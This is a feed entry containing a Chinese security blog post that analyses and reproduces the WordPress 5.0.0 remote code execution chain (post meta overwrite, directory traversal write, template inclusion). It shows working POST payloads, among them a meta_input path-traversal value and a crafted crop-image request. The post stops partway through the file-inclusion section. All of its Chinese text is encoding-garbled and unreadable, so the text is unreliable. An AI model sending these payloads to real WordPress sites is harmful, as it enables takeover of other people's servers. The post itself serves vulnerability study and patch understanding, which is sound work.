    <title>wordpress 5.0.0 RCEåˆ†æä¸å¤ç°</title>
    <link href="http://zer0yu.github.io/2019/03/06/wordpress-5-0-0-rce-aanalysis/"/>
    <id>http://zer0yu.github.io/2019/03/06/wordpress-5-0-0-rce-aanalysis/</id>
    <published>2019-03-05T17:15:35.000Z</published>
    <updated>2019-03-06T04:48:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00 æ¦‚è¿°"></a>0x00 æ¦‚è¿°</h2><p>RIPSäº2æœˆ20æ—¥åœ¨åšå®¢ä¸ŠæŠ«éœ²äº†ä¸€ä¸ªå…³äºWordPress 5.0.0çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ­¤æ¼æ´ç”±Post Metaå˜é‡è¦†ç›–ã€ç›®å½•ç©¿è¶Šå†™æ–‡ä»¶ã€æ¨¡æ¿åŒ…å«ç»„åˆåæ„æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="1-æ¼æ´è§¦å‘æ¡ä»¶"><a href="#1-æ¼æ´è§¦å‘æ¡ä»¶" class="headerlink" title="1.æ¼æ´è§¦å‘æ¡ä»¶"></a>1.æ¼æ´è§¦å‘æ¡ä»¶</h3><p>ï¼ˆ1ï¼‰å­˜åœ¨æ¼æ´çš„wordpressç‰ˆæœ¬å¦‚ä¸‹ï¼š<br><a href="https://github.com/WordPress/WordPress/commit/43bdb0e193955145a5ab1137890bb798bce5f0d2" target="_blank" rel="noopener">WordPress commit \&lt;= 43bdb0e193955145a5ab1137890bb798bce5f0d2 ï¼ˆWordPress 5.1-alpha-44280ï¼‰</a><br>ï¼ˆ2ï¼‰éœ€è¦ä½œè€…æƒé™çš„è´¦å·</p><h3 id="2-æ¼æ´çš„å½±å“èŒƒå›´"><a href="#2-æ¼æ´çš„å½±å“èŒƒå›´" class="headerlink" title="2.æ¼æ´çš„å½±å“èŒƒå›´"></a>2.æ¼æ´çš„å½±å“èŒƒå›´</h3><p>å—å½±å“çš„wordpressç‰ˆæœ¬ä¸ºï¼š<br>1.WordPress 5.1-alpha-44280æ›´æ–°å<br>2.æœªæ›´æ–°çš„4.9.9~5.0.0çš„WordPress<br>æœåŠ¡ç«¯ï¼šwindowsã€linuxã€mac<br>å›¾ç‰‡å¤„ç†åº“ï¼šgd/imagick</p><h2 id="0x01-ç¯å¢ƒé…ç½®"><a href="#0x01-ç¯å¢ƒé…ç½®" class="headerlink" title="0x01 ç¯å¢ƒé…ç½®"></a>0x01 ç¯å¢ƒé…ç½®</h2><p>wordpressåœ¨æŸä¸ªç‰ˆæœ¬ä»¥åï¼Œå°±å¢åŠ äº†è‡ªåŠ¨å‡çº§å°ç‰ˆæœ¬çš„åŠŸèƒ½ã€‚æ‰€ä»¥å®‰è£…å¥½wpä»¥åï¼Œéœ€è¦æ‰‹å·¥åœ¨wp-config.phpä¸­åŠ ä¸ª<code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code>ï¼Œç¦æ­¢å…¶è‡ªåŠ¨æ›´æ–°ã€‚</p><p>ä»£ç ä¸‹è½½æœ€å¥½åˆ°å¯¹åº”çš„<a href="https://cn.wordpress.org/" target="_blank" rel="noopener">wordpressç½‘ç«™</a>ä¸‹è½½ï¼Œå› ä¸ºå®˜æ–¹github releaseç‰ˆæœ¬éƒ½è¢«patchäº†ã€‚æ­¤å¤„çš„åˆ†æé‡‡ç”¨çš„æ˜¯ä»wordpressä¸­æ–‡ç½‘ä¸‹è½½çš„4.9.4ç‰ˆæœ¬ä»£ç ã€‚</p><p>æœ¬æ–‡çš„ç¯å¢ƒæ­å»ºï¼šmacOS+php7+wordpress4.9.4+imagick6.9.7</p><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h2><h3 id="1-Post-Metaå˜é‡è¦†ç›–"><a href="#1-Post-Metaå˜é‡è¦†ç›–" class="headerlink" title="1.Post Metaå˜é‡è¦†ç›–"></a>1.Post Metaå˜é‡è¦†ç›–</h3><p>æ­¤å¤„çš„æ¼æ´ç‚¹å‡ºç°åœ¨wordpress åª’ä½“åŠŸèƒ½åœ¨æ›´æ–°è¢«ç¼–è¾‘çš„å›¾ç‰‡å¤„ï¼Œæˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡ä¹‹åï¼Œå›¾ç‰‡çš„ä¿å­˜è·¯å¾„æ˜¯<code>wp-content/uploads/years/month</code>ï¼ŒåŒæ—¶ä¼šåœ¨æ•°æ®åº“çš„<code>wp_postmeta</code>è¡¨ä¸­<code>_wp_attached_file</code>å’Œ<code>_wp_attachment_metadata</code>æ’å…¥å¯¹åº”çš„å€¼ï¼Œç¬¬ä¸€ä¸ªå€¼æ˜¯å›¾ç‰‡çš„è·¯å¾„+å›¾ç‰‡åï¼Œç¬¬äºŒä¸ªæ˜¯å›¾ç‰‡çš„ç›¸å…³ä¿¡æ¯è¢«åºåˆ—åŒ–åçš„å€¼ï¼Œå…·ä½“ä¿¡æ¯å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br><img src="https://i.loli.net/2019/03/03/5c7b439ce5b3c.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸Šåˆ11.01.17.png"><br>æ¥ä¸‹æ¥æˆ‘ä»¬å®šä½åˆ°æ­¤å¤„çš„æ¼æ´ç‚¹ï¼Œåœ¨ç¼–è¾‘å¹¶æ›´æ–°å›¾ç‰‡çš„æ—¶å€™ä¼šè°ƒç”¨edit_post()å‡½æ•°ï¼Œwp-admin/includes/post.php:187<br><img src="https://i.loli.net/2019/03/03/5c7b4799e13b4.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸Šåˆ11.18.30.png"><br>ä»ä¸­å¯ä»¥çœ‹åˆ°è¯¥æ–¹æ³•çš„å‚æ•°æ¥è‡ª<code>$_POST</code>,å¹¶ä¸”æ­¤å¤„ä¹Ÿæ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ï¼Œåœ¨èµ‹å€¼ç»™<code>$post_data</code>ä¹‹åï¼Œè¢«å¸¦å…¥åˆ°<code>wp_update_post()</code>å‡½æ•°ã€‚æˆ‘ä»¬åŠ¨æ€è°ƒè¯•è·Ÿä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨æ ˆã€‚é¦–å…ˆæˆ‘ä»¬ç›´æ¥è®©ç¨‹åºè¿è¡Œåˆ°<code>update_post_meta()</code>è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ ¹æ®<code>$post_ID</code>ä¿®æ”¹<code>post meta field</code>ï¼Œæ¥ç€è°ƒç”¨<code>update_metadata()</code>æ›´æ–°metaæ•°æ®ï¼Œå®Œæˆä¹‹åæ›´æ–°postæ•°æ®ã€‚ä½†æ˜¯åœ¨æ­¤å¤„å¹¶æ²¡æœ‰å¯¹postçš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬çš„<code>$post_data[&quot;meta_input&quot;][&quot;_wp_attached_file&quot;]</code>çš„å€¼ä¹Ÿæ²¡æœ‰è¢«è¿‡æ»¤æ‰ã€‚<br><img src="https://i.loli.net/2019/03/03/5c7b5cab0f798.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ12.48.07.png"><br>æˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>wp_update_post()</code>å‡½æ•°ï¼Œç‚¹å‡»æ­¥è¿›åè¿›å…¥<code>wp_update_post()</code>å‡½æ•°ï¼Œwp-includes/post.php:3611<br><img src="https://i.loli.net/2019/03/03/5c7b5f1b5cdf7.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ12.57.47.png"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªå‡½æ•°çš„æœ«å°¾å¤„ï¼Œå¦‚æœpost_typeçš„å€¼æ˜¯attachmentç±»å‹å°±ä¼šè°ƒç”¨<code>wp_insert_attachment()</code>å‡½æ•°ï¼Œwp-includes/post.php:4898ã€‚<br><img src="https://i.loli.net/2019/03/03/5c7b606a0a0e3.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ1.04.31.png"><br>æˆ‘ä»¬ç»§ç»­æ­¥è¿›è·Ÿä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å®ƒæ¥ç€è°ƒç”¨äº†<code>wp_insert_post()</code>å‡½æ•°ï¼Œwp-includes/post.php:3044<br>åœ¨ç¬¬3434è¡Œå¯ä»¥çœ‹åˆ°å¯¹äºmeta_inputå‚æ•°ï¼Œæ­¤å¤„éå†ä¼ å…¥<code>update_post_meta()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://i.loli.net/2019/03/03/5c7b630b3a4cc.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ1.15.42.png"><br><code>update_post_meta()</code>å‡½æ•°ï¼Œwp-includes/post.php:1799<br>å‘ç°å…¶ä¸­è°ƒç”¨äº†<code>update_metadata()</code>å‡½æ•°æ¥åšè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œè·Ÿè¿›åå‘ç°<code>update_metadata()</code>ä½¿ç”¨æ¥å°†æ•°æ®åº“ä¸­å¯¹åº”çš„é”®å€¼è¿›è¡Œæ›´æ–°æ“ä½œï¼Œè€Œä¸”åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹<code>meta_input</code>çš„å€¼åšä»»ä½•çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥æŒ‡å®šçš„ key æ¥è®¾ç½®å®ƒçš„å€¼ã€‚<br><img src="https://i.loli.net/2019/03/03/5c7b703fb6665.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ2.11.11.png"><br><img src="https://i.loli.net/2019/03/03/5c7b71445620f.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ2.16.24.png"><br>åœ¨æ­¤æˆ‘ä»¬å›é¡¾ä¸€ä¸‹è¿™ä¸ªè°ƒç”¨æ ˆ<br><img src="https://i.loli.net/2019/03/03/5c7b7228a57e9.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ2.20.10.png"><br>å› æ­¤æˆ‘ä»¬æ„é€ POSTæ•°æ®åŒ…å°±å¯ä»¥è¦†ç›–æ‰<code>_wp_attached_file</code>çš„å€¼ï¼Œè¦†ç›–æ•ˆæœåŠæ“ä½œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å°†è¿™ä¸ªé™„åŠ åˆ°POSTæ•°æ®å</span></span><br><span class="line">&amp;meta_input[_wp_attached_file]=2019/03/z3r0yu.jpg?/../../../../themes/z3r0yu.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/03/5c7b735ce8c23.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ2.24.01.png"><br><img src="https://i.loli.net/2019/03/03/5c7b735cdc061.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ2.24.34.png"><br><img src="https://i.loli.net/2019/03/03/5c7b735cdcbbd.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ2.25.13.png"><br>åˆ°æ­¤ä¸ºæ­¢ç¬¬å¤„æ¼æ´ç‚¹çš„åˆ†æåˆ©ç”¨å·²ç»å®Œæˆï¼Œæ¼æ´è§¦å‘æœ€é‡è¦åŸå› å°±æ˜¯æ²¡æœ‰åšå¥½è¿‡æ»¤ï¼Œå› æ­¤è¯¥å¤„çš„è¡¥ä¸ä¸ºï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_diff_key( $post_data, array_flip( <span class="keyword">array</span>( <span class="string">'meta_input'</span>, <span class="string">'file'</span>, <span class="string">'guid'</span> ) ) );</span><br></pre></td></tr></table></figure></p><p>ä»è¡¥ä¸ä¸Šå¯ä»¥çœ‹åˆ°å¯¹<code>meta_input</code>åšäº†è¿‡æ»¤(PS:ä½ ä¸‹è½½çš„ä»£ç ä¸­è¦æ˜¯å‡ºç°è¿™ä¸ªå°±è¯´æ˜æ˜¯è¢«patchè¿‡äº†)ã€‚</p><h3 id="2-ç›®å½•ç©¿è¶Šé€ æˆæ–‡ä»¶å†™å…¥"><a href="#2-ç›®å½•ç©¿è¶Šé€ æˆæ–‡ä»¶å†™å…¥" class="headerlink" title="2.ç›®å½•ç©¿è¶Šé€ æˆæ–‡ä»¶å†™å…¥"></a>2.ç›®å½•ç©¿è¶Šé€ æˆæ–‡ä»¶å†™å…¥</h3><p>è¯¥é—®é¢˜æ˜¯å»ºç«‹åœ¨ä¹‹å‰æˆ‘ä»¬Post Metaå˜é‡è¦†ç›–æ¼æ´ä¹‹ä¸Šçš„ã€‚å› ä¸ºåœ¨ä¹‹å‰æˆ‘ä»¬æ˜¯å¯ä»¥åœ¨<code>_wp_attached_file</code>å¤„å†™å…¥ä»»æ„å€¼çš„ï¼Œå› æ­¤åªéœ€è¦ä¸€ä¸ªæ–¹æ³•å°†æˆ‘ä»¬å†™å…¥çš„å€¼è¿›è¡Œåˆ©ç”¨ä¸€ä¸‹å°±å¥½ã€‚<br>åœ¨wordpressçš„å›¾ç‰‡è£å‰ªåŠŸèƒ½ä¸­ï¼Œå¯ä»¥å®ç°æœ¬åœ°æ–‡ä»¶è¯»å–å’Œè¿œç¨‹æ–‡ä»¶è¯»å–ã€‚ä½†æ˜¯è¿œç¨‹æ–‡ä»¶è¯»å–è¿™ä¸ªä½ç½®å¾ˆæœ‰æ„æ€ï¼Œå¦‚æœç›®æ ‡å›¾ç‰‡åœ¨è¯¥ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™é€šè¿‡<strong>æœ¬åœ°æœåŠ¡å™¨</strong>ä¸‹è½½è¯¥å›¾ç‰‡ï¼Œå¦‚ä»<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg</code>ä¸‹è½½ï¼Œè£å‰ªåé‡æ–°ä¿å­˜ã€‚æ­¤å¤„æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªå¸¦å‚æ•°çš„urlï¼Œæ¯”å¦‚<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?z3r0yu</code>ï¼Œåœ¨è¿œç¨‹è¯»å–çš„æ—¶å€™ä¼šå¿½ç•¥?å·ä¹‹åçš„å†…å®¹ï¼Œä»è€Œåªå¯¹2233.jpgè¿›è¡Œå‰ªåˆ‡åä¿å­˜ã€‚ç›®å½•ç©¿è¶Šé—®é¢˜å°±å­˜åœ¨äºæ­¤ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ å¦‚ä¸‹æ‰€ç¤ºçš„url<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg</code>ï¼Œwordpresså°†è£å‡åçš„å›¾ç‰‡ä¿å­˜è‡³<code>wp-content/themes/twentysixteen/</code>ç›®å½•ä¸‹ï¼Œå¦‚æœå›¾ç‰‡ä¸­åŒ…å«æ¶æ„ä»£ç å°±å¯èƒ½è¢«è¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚</p><p>ç¼–è¾‘å›¾ç‰‡ä¼šå…ˆè°ƒç”¨<code>do_action</code>é€šè¿‡<code>apply_filters()</code>å‡½æ•°è¿›å…¥<code>wp_ajax_crop_image()</code>å‡½æ•°ï¼Œåœ¨wp-admin/includes/ajax-actions.php:3224<br><img src="https://i.loli.net/2019/03/03/5c7b9d181c1cb.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ5.23.22.png"><br>åœ¨å‡½æ•°ä¸­é¦–å…ˆä¼šè°ƒç”¨<code>check_ajax_referer()</code>å‡½æ•°æ¥å¯¹ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œä¹‹åè°ƒç”¨<code>absint()</code>å‡½æ•°å°†<code>$_POST[&#39;cropDetails&#39;]</code>çš„å€¼è½¬æ¢ä¸ºéè´Ÿå€¼ï¼Œä¹‹åå°†å‚æ•°ä¼ å…¥<code>wp_crop_image()</code>å‡½æ•°å¯¹å›¾ç‰‡è¿›è¡Œå‰ªè£æ“ä½œï¼Œwp-admin/includes/image.php:25ã€‚(PS:ä½ å¦‚æœæƒ³è¦åŠ¨æ€è°ƒè¯•ç»è¿‡è¿™ä¸€æ­¥å°±è¦æ»¡è¶³ä¸Šé¢é‚£äº›æ¡ä»¶)<br><img src="https://i.loli.net/2019/03/03/5c7bb5457da91.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.06.33.png"><br>ä»æ•°æ®åº“å–å‡º<code>_wp_attached_file</code>åå¹¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹å‰è®¾ç½®çš„å€¼åœ¨æ­¤å¤„å·²ç»æ˜¯å®Œå¥½çš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br><img src="https://i.loli.net/2019/03/03/5c7bb6ca40804.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.12.06.png"><br>åªæœ‰ä¾æ®<code>_wp_attached_file</code>çš„å€¼åšäº†åˆ¤æ–­ï¼Œå‘ç°æ–‡ä»¶ä¸å­˜åœ¨å¼€å§‹å»è°ƒç”¨<code>_load_image_to_edit_path()</code>å‡½æ•°ï¼Œæˆ‘ä»¬è¿›è¡Œè·Ÿè¿›ï¼Œwp-admin/includes/image.php:649<br><img src="https://i.loli.net/2019/03/03/5c7bb7f48c935.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.18.02.png"><br>ç»§ç»­è·Ÿè¿›åå‘ç°è°ƒç”¨äº†<code>wp_get_attachment_url()</code>æ¥æ‹¼æ¥urlé“¾æ¥ã€‚<br><img src="https://i.loli.net/2019/03/03/5c7bbc01d72a8.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.35.18.png"><br><img src="https://i.loli.net/2019/03/03/5c7bbc6c0e928.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.37.06.png"><br>ä¹‹åä¸Šé¢æ‹¼æ¥çš„urlé“¾æ¥ä¼ è¾“åˆ°<code>wp_get_image_editor()</code>å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æ­¥è¿›è·Ÿä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œwp-includes/media.php:2900<br><img src="https://i.loli.net/2019/03/03/5c7bbd7ce4a66.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.41.33.png"><br>è·Ÿè¿›åå‘ç°å…¶ä¸­è°ƒç”¨äº†<code>_wp_image_editor_choose()</code>å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›ï¼Œwp-includes/media.php:2950<br><img src="https://i.loli.net/2019/03/03/5c7bbe5529943.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.45.15.png"><br>ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°Wordpressæä¾›äº†ä¸¤ç§æ–¹å¼æ¥å¤„ç†å›¾ç‰‡ï¼Œä¼˜å…ˆä½¿ç”¨Imagickï¼Œä¹‹åæ˜¯GDã€‚æˆ‘ä»¬åœ¨æ­¤è¦ç‰¹åˆ«æ³¨æ„ï¼Œè¿™ä¿©å¯¹å›¾ç‰‡çš„å¤„ç†æ–¹å¼æ˜¯ä¸åŒçš„ï¼š</p><ol><li>Imagickä¸ä¼šå»é™¤æ‰å›¾ç‰‡ä¸­çš„exiféƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å¾…æ‰§è¡Œpayloadä»£ç åŠ å…¥åˆ°exiféƒ¨åˆ†ã€‚</li><li>GDä¼šå»é™¤å›¾ç‰‡çš„exiféƒ¨åˆ†ï¼Œå¹¶ä¸”å…¶ä¸­çš„phpcodeå¾ˆéš¾å­˜æ´»ã€‚é™¤éé€šè¿‡ç²¾å¿ƒæ„é€ ä¸€å¼ å›¾ç‰‡æ‰å¯ä»¥ã€‚</li></ol><p>æˆ‘åœ¨æ­¤åªè°ˆå¤ç°åˆ†æï¼Œæš‚æ—¶ä¸è°ˆå¯¹å›¾ç‰‡çš„Fuzzï¼Œå› æ­¤é€‰æ‹©Imagickåº“ã€‚</p><p>PS:Imagickå¤„ç†ç±»çš„loadå‡½æ•°ä¸­è°ƒç”¨çš„æ˜¯readImageå‡½æ•°ï¼Œä½†åœ¨é«˜ç‰ˆæœ¬çš„Imagickä¸Šè¯¥å‡½æ•°ä¸æ”¯æŒè¿œç¨‹å›¾ç‰‡é“¾æ¥ï¼Œå› æ­¤æœ€å¥½é‡‡ç”¨Imagick-6.9.7åŠå…¶ä»¥ä¸‹ç‰ˆæœ¬ã€‚</p><p>å®Œæˆå›¾ç‰‡å‰ªè£åå°±å†æ¬¡è¿›å…¥<code>wp_crop_image()</code>å‡½æ•°ä¸­ï¼Œ<code>$dst_file</code>çš„å€¼æ˜¯æ–‡ä»¶åï¼Œå› æ­¤æœ€ç»ˆè·¯å¾„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://i.loli.net/2019/03/03/5c7bc18c8f840.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ7.55.15.png"></p><p>ä¹‹åå°±æ˜¯æœªç»ä»»ä½•è¿‡æ»¤è¿›å…¥åˆ°<code>wp_mkdir_p()</code>å‡½æ•°æ¥åˆ›å»ºç›®å½•ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›åå‘ç°å…¶ä¸­ä¹Ÿæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ‰§è¡Œåˆ°<code>mkdir()</code>è¿›è¡Œç›®å½•åˆ›å»ºï¼Œæ­¤æ—¶<code>$target</code>çš„å€¼å¦‚ä¸‹æ‰€ç¤º:<br><img src="https://i.loli.net/2019/03/03/5c7bd1ce0e1dc.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ9.08.19.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$target:&quot;/Applications/XAMPP/xamppfiles/htdocs/wp494/wp-content/uploads/2019/03/z3r0yu.jpg?/../../../../themes&quot;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®Œè·¯å¾„ä¹‹åï¼Œè°ƒç”¨<code>save()</code>å¯¹å›¾ç‰‡è¿›è¡Œä¿å­˜ï¼Œæˆ‘ä»¬å•æ­¥è·Ÿè¿›<code>save()</code>å‡½æ•°ï¼Œwp-includes/class-wp-image-editor-gd.php:364</p><p><img src="https://i.loli.net/2019/03/03/5c7bd4fbcab7c.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ9.21.40.png"><br>åœ¨<code>save()</code>ä¸­è°ƒç”¨äº†<code>make_image()</code>å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›åˆ°wp-includes/class-wp-image-editor.php:394<br><img src="https://i.loli.net/2019/03/03/5c7bd4fbc8a3f.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ9.21.10.png"><br>æ­¤å¤„ä¼šç”¨<code>call_user_func_array</code>å‡½æ•°æ¥è°ƒç”¨Imagickçš„<code>writeImage</code>å‡½æ•°ï¼Œå¹¶å°†<code>$filename</code>ä¼ é€’è¿›å»ï¼Œä½†æ˜¯åœ¨Linuxå¹³å°ä¸Šæ­¤å‡½æ•°æ˜¯ä¸æ”¯æŒä¸å­˜åœ¨çš„ç›®å½•è·³è½¬çš„ã€‚æˆ‘ä»¬çš„<code>z3r0yu.jpg?/</code>åœ¨è¿™é‡Œå°±æ˜¯ä¸å­˜åœ¨ç›®å½•ï¼Œè¿™ä¸ªå‡½æ•°å¦‚æœè¢«è°ƒç”¨å°±ä¼šæŠ›å‡ºé”™è¯¯ï¼Œä»è€Œæ— æ³•è¾¾åˆ°ä»»æ„å†™çš„ç›®çš„ã€‚å¦‚æœæƒ³è¿›è¡Œç»•è¿‡åªéœ€è¦å¤šæ¬¡ä¸Šä¼ è£å‰ªå°±å¯ä»¥ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹æ­¤éƒ¨åˆ†è¿›è¡Œåˆ©ç”¨ï¼Œæˆ‘ä»¬æ¥ç€Post Metaå˜é‡è¦†ç›–çš„åˆ©ç”¨ä¹‹åè¿›è¡Œï¼Œä½¿ç”¨wordpressçš„å‰ªåˆ‡åŠŸèƒ½å¹¶åœ¨å‰ªåˆ‡å®Œä¿å­˜å›¾ç‰‡çš„æ—¶å€™è¿›è¡ŒburpæŠ“åŒ…å¹¶å°†è¦POSTçš„æ•°æ®ä¿®æ”¹å¦‚ä¸‹ï¼ˆPS:_ajax_nonceå’Œidçš„å€¼è¦ä¸ä¹‹å‰ä¿æŒä¸€è‡´ï¼‰ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=crop-image&amp;_ajax_nonce=0810f2d564&amp;id=10&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/03/5c7b8d4c08a1e.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ4.11.54.png"><br>æœ€ç»ˆä¼šåœ¨æˆ‘ä»¬æŒ‡å®šçš„ç›®å½•ä¸‹ç”Ÿæˆå‰ªè£åçš„å›¾ç‰‡<br><img src="https://i.loli.net/2019/03/03/5c7b8d4bca96e.png" alt="å±å¹•å¿«ç…§ 2019-03-03 ä¸‹åˆ4.12.09.png"><br>æ—¢ç„¶å¯ä»¥æˆåŠŸåœ¨æŒ‡å®šç›®å½•ä¸‹å†™å…¥å›¾ç‰‡æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥æ„é€ ä¸€ä¸ªåŒ…å«æœ‰shellçš„å›¾ç‰‡ã€‚ä½†æ˜¯æ–‡ä»¶åªèƒ½æ˜¯jpgï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç»“åˆæœ¬åœ°æ–‡ä»¶åŒ…å«åšè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚</p><p>å°ç»“ï¼šæ­¤éƒ¨åˆ†æˆ‘ä»¬å°†POSTçš„æ•°æ®è¿›è¡Œäº†ä¿®æ”¹ï¼Œç›®çš„æ˜¯ä¿®æ”¹<code>action</code>ä¸º<code>crop-image</code>è¾¾åˆ°è§¦å‘å­˜åœ¨æ¼æ´çš„<code>wp_crop_image()</code>å‡½æ•°ã€‚</p><h3 id="3-æœ¬åœ°æ–‡ä»¶åŒ…å«-æ¨¡æ¿åŠŸèƒ½"><a href="#3-æœ¬åœ°æ–‡ä»¶åŒ…å«-æ¨¡æ¿åŠŸèƒ½" class="headerlink" title="3.æœ¬åœ°æ–‡ä»¶åŒ…å«(æ¨¡æ¿åŠŸèƒ½)"></a>3.æœ¬åœ°æ–‡ä»¶åŒ…å«(æ¨¡æ¿åŠŸèƒ½)</h3><p>ä¹‹å‰çš„å·¥ä½œæˆ‘ä»¬å·²ç»è¾¾åˆ°äº†ä»»æ„æ–‡ä»¶å†™å…¥çš„ç›®çš„ï¼Œå¦‚æœæƒ³å¯¹å›¾ç‰‡ä¸­çš„ä»£ç è¿›è¡Œåˆ©ç”¨ï¼Œæˆ‘ä»¬å¿…é¡»ç»“åˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ­¤å¤„æˆ‘ä»¬å·²ç»é¢„å…ˆçŸ¥é“äº†æ–‡ä»¶åŒ…å«ç‚¹åœ¨wordpressçš„æ¨¡æ¿ä½ç½®ï¼Œå®ƒä¼šæ ¹æ®éœ€è¦åŠ è½½çš„é¡µé¢ç±»å‹ä»å½“å‰ä¸»é¢˜ä¸‹é€‰æ‹©éœ€è¦çš„æ¨¡æ¿ï¼Œå¦‚æœå­˜åœ¨å°±ä¼šè¢«åŒ…å«ã€‚å› æ­¤æˆ‘ä»¬åœ¨æ­¤å¤„ä¸»è¦å…³æ³¨ä¸æ¨¡æ¿åŒ…å«ç›¸å…³çš„å‡½æ•°ã€‚</p><p>ä¹‹å‰æˆ‘åœ¨æ•°æ®åº“ä¸­å…³æ³¨åˆ°ä¸€ä¸ª<code>_wp_page_template</code>å­—æ®µï¼Œè€Œåœ¨wordpressä¸­æ¨¡æ¿æ–‡ä»¶ä½ç½®å°±æ˜¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚è¯¦æŸ¥ä¸€ä¸‹å‘ç°åŠ 